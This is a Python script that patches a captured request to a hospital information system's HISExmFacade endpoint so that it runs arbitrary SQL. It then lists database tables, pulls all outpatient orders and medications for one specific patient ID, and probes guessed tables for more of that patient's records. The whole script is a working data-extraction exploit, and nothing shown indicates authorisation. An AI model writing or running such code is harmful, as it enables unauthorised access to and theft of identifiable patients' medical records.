from his_client_final import HISClient
import sys, re

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding='utf-8')

c = HISClient()

def execute_sql(sql_query):
    import zlib, os, requests
    template_path = "HISExmFacade_payload_0.bin"
    if not os.path.exists(template_path): return None
    with open(template_path, "rb") as f:
        compressed_template = f.read()
    try: decompressed = zlib.decompress(compressed_template)
    except: decompressed = compressed_template
    original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
    target_len = len(original_sql_bytes)
    padded_sql = sql_query.ljust(target_len)
    patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
    resp = requests.post(f"{c.base_url}/HISExmFacade", data=zlib.compress(patched_payload), headers=c.headers)
    if resp.status_code == 200:
        return zlib.decompress(resp.content).decode('utf-8', errors='ignore')
    return None

def parse_rows(text, tag="DRMODIFY"):
    if not text: return []
    rows = re.findall(f'<{tag}[^>]*>(.*?)</{tag}>', text, re.DOTALL)
    out = []
    for r in rows:
        fields = re.findall(r'<(\w+)>(.*?)</\1>', r)
        out.append({k: v for k, v in fields})
    return out

# 1. Search for CONSULT in ALL_TABLES
print("[*] Searching ALL_TABLES for '%CONSULT%'...")
q_c = "SELECT OWNER, TABLE_NAME FROM ALL_TABLES WHERE TABLE_NAME LIKE '%CONSULT%' AND ROWNUM <= 50"
res_c = execute_sql(q_c)
rows_c = parse_rows(res_c)
for r in rows_c:
    print(f"  Table: {r.get('OWNER')}.{r.get('TABLE_NAME')}")

# 2. Check all OPDORDM entries for patient 003380272B
target = "003380272B"
print(f"\n[*] Fetching all OPDORDM entries for {target}...")
q_o = f"SELECT * FROM OPDUSR.OPDORDM WHERE HHISNUM = '{target}' ORDER BY BEGINDATETIME DESC"
res_o = execute_sql(q_o)
rows_o = parse_rows(res_o)
if rows_o:
    print(f"  [+] Found {len(rows_o)} total orders.")
    # Group by OPDCASENO to see different visits
    visits = {}
    for r in rows_o:
        cn = r.get('OPDCASENO', 'UNKNOWN')
        if cn not in visits: visits[cn] = []
        visits[cn].append(r)
    
    print(f"  [+] Unique OPDCASENO count: {len(visits)}")
    for cn, items in visits.items():
        # Check if it's a medication (ORTYPE OD or similar)
        meds = [i for i in items if i.get('ORTYPE') == 'OD']
        procs = [i for i in items if i.get('ORTYPE') != 'OD']
        print(f"  Case {cn}: {len(meds)} meds, {len(procs)} other orders. Date: {items[0].get('BEGINDATETIME')}")
        if meds:
            print(f"    - First med: {meds[0].get('PFNM')}")

# 3. Try to find a high-level OPD visit table by querying common ones with HHISNUM
opd_probes = ['OPDUSR.OPD_PAT_VISIT', 'OPDUSR.OPD_PAT_CASE', 'SYSTEM.PAT_OPD_VISIT', 'SYSTEM.OPD_CASE']
for p in opd_probes:
    print(f"[*] Probing {p} for {target}...")
    try:
        res = execute_sql(f"SELECT * FROM {p} WHERE HHISNUM = '{target}'")
        if res and '<NewDataSet>' in res:
            rows = parse_rows(res)
            if rows:
                print(f"  [+] SUCCESS: {p} has {len(rows)} records for this patient.")
                print(f"  [+] Keys: {rows[0].keys()}")
    except: pass
